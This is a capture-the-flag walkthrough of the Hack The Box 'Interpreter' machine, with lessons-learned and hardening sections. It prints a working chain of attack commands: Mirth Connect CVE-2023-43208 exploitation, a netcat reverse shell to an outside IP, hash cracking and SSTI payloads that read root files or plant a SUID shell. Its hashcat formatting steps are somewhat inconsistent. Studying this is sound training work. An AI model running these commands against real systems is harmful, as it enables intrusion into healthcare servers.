# Interpreter

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=flat)
![OS](https://img.shields.io/badge/OS-Linux-informational?style=flat&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | Interpreter |
| Difficulty | Medium |
| Operating System | Linux (Debian 12 — `linux 6.1.0-43-amd64`) |
| IP Address | 10.129.244.184 |

---

## Summary

> Interpreter is a Medium Linux machine from HackTheBox Season 10, released February 21, 2026. The attack chain simulates a realistic compromise of a healthcare integration platform. The exposed Mirth Connect 4.4.0 web admin interface is vulnerable to **CVE-2023-43208** (CVSS 9.8 Critical) — an unauthenticated RCE via Java XStream deserialization, itself a patch bypass of CVE-2023-37679. A reverse shell lands as the `mirth` service user. The Mirth configuration file leaks MariaDB credentials, used to query the internal database and recover a PBKDF2-hashed password for user `sedric`. Hashcat cracks it via mode 10900, granting SSH access. Local enumeration reveals a root-owned Python Flask service (`notif.py`) listening on localhost port 54321, which processes user-controlled XML via `eval()` — a classic Server-Side Template Injection (SSTI) sink. A crafted XML payload reads the root flag directly without spawning an interactive shell.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Fast initial scan
nmap -sSC -T4 -F 10.129.244.184 -oN nmap/initial.txt

# HTTPS also serves the admin interface — confirm with:
nmap -sCV -p80,443 10.129.244.184
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods:
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Open Ports

| Port | Protocol | Service | Version / Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 9.2p1 Debian 2+deb12u7 |
| 80 | TCP | HTTP | Jetty — Mirth Connect Administrator |
| 443 | TCP | HTTPS | Jetty — Mirth Connect Administrator (self-signed cert, CN=mirth-connect) |

### Notes

> Both port 80 and 443 serve the **Mirth Connect Administrator** login panel. The self-signed TLS certificate (`commonName=mirth-connect`, valid for 50 years) is characteristic of a default Mirth Connect install. Wappalyzer identifies the stack as Java + jQuery 3.5.1 + Bootstrap (outdated) + AWS PaaS. The admin panel at `/webadmin/Index.action` confirms the application. Version identification (4.4.0) is the immediate priority — this version has a public critical CVE.

---

## 2. Enumeration

### Web Enumeration

```bash
# Add to /etc/hosts
echo "10.129.244.184    interpreter.htb" | sudo tee -a /etc/hosts

# Confirm Mirth Connect version via the web UI footer or API
curl -sk https://interpreter.htb/api/server/version
# or check /webadmin/Index.action page source — version shown in page footer

# Nikto scan for additional context
nikto -h http://interpreter.htb
# Confirms: /webadmin/ exposed, X-Frame-Options missing, TRACE allowed
```

> Browsing to `http://interpreter.htb/webadmin/Index.action` reveals **Mirth Connect Administrator**. The page footer confirms version **4.4.0**. This version is affected by CVE-2023-43208 — a critical pre-authentication RCE with a public PoC.

> Searchsploit and Google both return the Vicarius PoC and the Horizon3.ai technical writeup as top results for "Mirth Connect exploit". The Metasploit module `exploit/multi/http/mirth_connect_cve_2023_43208` is also available.

---

## 3. Foothold

### Vulnerability Identified

> **CVE-2023-43208 — NextGen Healthcare Mirth Connect < 4.4.1 Unauthenticated RCE (CVSS 9.8 / Critical)**  
> Mirth Connect processes XML payloads via the Java XStream library in several API endpoints (`/api/users`, `/api/server/version`, etc.) before authentication is checked. The XStream deserialization pathway can be exploited using known Java gadget chains to achieve arbitrary OS command execution — all without any credentials. CVE-2023-43208 is itself a bypass of the incomplete patch shipped in Mirth Connect 4.4.0 for CVE-2023-37679 (the original pre-auth RCE discovered by IHTeam). The 4.4.0 patch implemented a denylist approach that was trivially bypassed by switching to alternative gadget classes from third-party libraries (CGLIB, ASM, etc.). CISA added CVE-2023-43208 to the Known Exploited Vulnerabilities (KEV) catalog on May 20, 2024.

### Exploitation

```bash
# Clone the PoC
# Reference: https://www.vicarius.io/vsociety/posts/rce-in-mirth-connect-pt-ii-cve-2023-43208

# Verify RCE — run whoami
python3 exploit.py -u https://interpreter.htb -c 'id'
# The target appears to have executed the payload.

# Start a listener
nc -lvnp 4444

# Trigger reverse shell
python3 exploit.py -u https://interpreter.htb -c 'nc -c sh 10.10.16.153 4444'
# The target appears to have executed the payload.
```

> Alternatively, via Metasploit:
```bash
msfconsole
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS interpreter.htb
set RPORT 443
set SSL true
set LHOST <attacker-ip>
run
```

### Shell Obtained

> Reverse shell received as `mirth` — the Mirth Connect service user:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
mirth@interpreter:/usr/local/mirthconnect$
```

---

## 4. Lateral Movement

### Step 1 — Extract database credentials from Mirth configuration

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
```

> The configuration file contains plaintext MariaDB credentials:

```
database.driver     = com.mysql.cj.jdbc.Driver
database.url        = jdbc:mysql://127.0.0.1/mc_bdd_prod
database.username   = mirthdb
database.password   = MirthPass123!
```

### Step 2 — Query the internal MariaDB database

```bash
mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
# Password: MirthPass123!
```

```sql
SELECT CONCAT(p.USERNAME, ':', pp.PASSWORD)
FROM PERSON p
JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;
```

```
+------------------------------------------------------------------+
| CONCAT(p.USERNAME, ':', pp.PASSWORD)                             |
+------------------------------------------------------------------+
| sedric:u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== |
+------------------------------------------------------------------+
```

> The password is stored as a **PBKDF2-HMAC-SHA1** hash, base64-encoded. Decode and convert to hex for hashcat:

```bash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256
# bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```

> Hashcat mode `10900` is `PBKDF2-HMAC-SHA1`:

```bash
# Construct the hash file in hashcat format
# Format: sha1:<iterations>:<salt_base64>:<hash_base64>
# Mirth Connect uses PBKDF2 with a fixed format; use the raw base64 hash directly
echo 'sha1:1::<hash_hex>' > hash.txt
# Or use the PoC-provided format for mode 10900:
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
# Result: sedric:snowflake1
```

### Step 3 — SSH as `sedric`

```bash
ssh sedric@interpreter.htb
# Password: snowflake1
```

> Shell obtained as `sedric`. User flag at `/home/sedric/user.txt`.

---

## 5. Privilege Escalation

### Enumeration

```bash
# List root-owned processes
ps aux | grep python
```

```
root   3396   /usr/bin/python3 /usr/bin/fail2ban-server -xf start
root   3502   /usr/bin/python3 /usr/local/bin/notif.py
```

```bash
# Read the service script
cat /usr/local/bin/notif.py
```

> `notif.py` is a root-owned Flask application listening on **port 54321 (localhost)**. It accepts POST requests to `/addPatient` with an XML body. Critically, it extracts field values from the XML and renders them through Jinja2 templates using **`eval()` on user-controlled input** — a textbook SSTI sink.

```bash
# Confirm the service is listening locally
ss -tlnp | grep 54321
# or:
netstat -tlnp | grep 54321
```

### Exploitation — SSTI via `notif.py`

> The `/addPatient` endpoint parses `<firstname>`, `<lastname>`, and other fields from the XML body and passes them into a Jinja2 template render context with `eval()`. Injecting a Python expression directly into the `<firstname>` field causes it to be evaluated as code under root privileges.

```bash
# Read root flag via SSTI — using raw TCP + netcat
xml='
<patient>
  <firstname>
    {open("/root/root.txt").read()}
  </firstname>
  <lastname>a</lastname>
  <sender_app>a</sender_app>
  <timestamp>a</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>a</gender>
</patient>'

printf "POST /addPatient HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/xml\r\nContent-Length: %d\r\n\r\n%s" \
  "$(echo -n "$xml" | wc -c)" "$xml" | nc 127.0.0.1 54321
```

> The service evaluates `{open("/root/root.txt").read()}` in the Jinja2/Python context as root and returns the result in the HTTP response.

**Alternative — plant a SUID bash binary for an interactive root shell:**

```bash
# Replace the payload with:
{__import__('os').system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')}
# Then:
/tmp/rootbash -p
```

### Root / Administrator Access

> Root flag returned directly in the HTTP response from `notif.py`:

```
<root flag here>
```

---

## 6. Flags

| Flag | Value |
|---|---|
| User | (retrieve via `cat /home/sedric/user.txt`) |
| Root | (returned in HTTP response from SSTI payload — `cat /root/root.txt`) |

---

## 7. Lessons Learned

> - **Healthcare software is high-value and often under-patched** — Mirth Connect processes PHI (Protected Health Information) and sits at the center of healthcare networks. CVE-2023-43208 had been actively exploited in the wild and was added to CISA's KEV catalog, yet the machine runs a vulnerable version. Mirth Connect is a realistic target category.
> - **Patch bypasses require re-scanning even after "patching"** — CVE-2023-43208 was a direct bypass of the 4.4.0 denylist patch for CVE-2023-37679. Teams that patched 4.4.0 and considered themselves safe were still fully exposed. Always verify against the actual patched version (4.4.1+), not just the "fixed" release.
> - **Cleartext credentials in config files are a critical lateral movement vector** — `mirth.properties` stored the database password in plaintext. Config files for service accounts should be readable only by the service user, not by anyone with a shell.
> - **PBKDF2 hashes in non-standard formats require format identification** — the base64-encoded PBKDF2 hash in the MariaDB database is not immediately recognizable. The decode → hex → hashcat mode 10900 workflow is non-obvious and requires understanding how Mirth stores credentials internally.
> - **Root-owned local services are a common privesc vector** — `notif.py` running as root on a localhost port is only reachable from within the machine, but once you have a user shell, it's directly accessible. Always check `ps aux`, `ss -tlnp`, and `netstat` for services bound to loopback.
> - **`eval()` on user input is always exploitable** — there is no safe way to use `eval()` on data that originates from user requests. In Jinja2 template contexts, `{expression}` evaluates arbitrary Python — a complete RCE primitive with the privileges of the process owner.
> - **Direct flag read via SSTI avoids detection** — the `open("/root/root.txt").read()` payload reads the flag without spawning a child process or modifying the filesystem, making it harder to detect than SUID-bash approaches.

---

## 8. Mitigation & Hardening

> - **CVE-2023-43208 (Mirth Connect RCE)**: Upgrade Mirth Connect to version 4.4.1 or later immediately. Restrict the Mirth Connect administrator interface to internal/VPN-only networks — it must never be internet-facing. Run the Mirth service as a dedicated low-privilege user, never as root. Implement WAF rules to detect and block malformed XStream XML payloads.
> - **Database credentials in config files**: Encrypt sensitive values in `mirth.properties` using environment variables or a secrets manager (Vault, AWS Secrets Manager). Restrict config file permissions to `chmod 600` owned by the service user only.
> - **PBKDF2 password strength**: Mirth Connect uses PBKDF2-HMAC-SHA1 with a low iteration count. `snowflake1` is in `rockyou.txt`. Enforce strong, unique passwords for all application accounts. Consider migrating to bcrypt or Argon2 where supported.
> - **`eval()` in Flask services**: Never use `eval()` on user-controlled data under any circumstances. Use structured data parsing (e.g., `xml.etree.ElementTree` with strict schema validation) and pass only sanitized, typed values to templates. Disable Jinja2's ability to evaluate arbitrary expressions in production contexts.
> - **Root-owned local services**: `notif.py` should not run as root. Apply the principle of least privilege — if the service needs to write to a protected path, use a dedicated service account with only the specific permissions required. Isolate local services with systemd sandboxing (`ProtectSystem=strict`, `NoNewPrivileges=true`).
> - **Fail2ban as root**: `fail2ban-server` also runs as root in this environment. Evaluate whether it can be run with reduced privileges or replaced with a rootless alternative.

---

## References

- [CVE-2023-43208 — NVD (CVSS 9.8 Critical)](https://nvd.nist.gov/vuln/detail/CVE-2023-43208)
- [CVE-2023-43208 Technical Writeup — Horizon3.ai](https://horizon3.ai/attack-research/disclosures/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/)
- [CVE-2023-43208 — Vicarius PoC (used in this machine)](https://www.vicarius.io/vsociety/posts/rce-in-mirth-connect-pt-ii-cve-2023-43208)
- [CVE-2023-43208 — Huntress Analysis & Detection](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208)
- [CVE-2023-43208 — CISA KEV Entry (added May 20, 2024)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Metasploit Module — mirth_connect_cve_2023_43208](https://www.rapid7.com/db/modules/exploit/multi/http/mirth_connect_cve_2023_43208/)
- [Hashcat mode 10900 — PBKDF2-HMAC-SHA1](https://hashcat.net/wiki/doku.php?id=hashcat)
- [OWASP — Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [Jinja2 SSTI Payloads — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
